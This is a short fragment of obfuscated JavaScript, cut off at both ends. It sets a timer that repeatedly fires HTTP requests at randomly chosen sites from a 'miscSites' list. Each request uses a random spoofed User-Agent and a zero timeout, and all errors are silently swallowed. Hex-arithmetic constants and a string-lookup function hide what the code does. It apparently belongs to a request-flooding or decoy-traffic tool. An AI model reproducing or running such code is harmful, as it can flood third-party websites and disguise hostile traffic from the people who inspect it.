  })['catch'](h => {}), setInterval(() => {
    const a4 = d;
    f[a4(0x10)](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x7 * -0x7be + -0x7 * -0x296 + -0x2cf4) * getRandomInt(0x1110 + 0x17 * 0x7f + -0x1c78, 0x1 * -0xf3 + 0x14b * -0x11 + 0x16f3));
}, 0x14b4 + -0xe * 0x239 + -0x3 * -0x39a);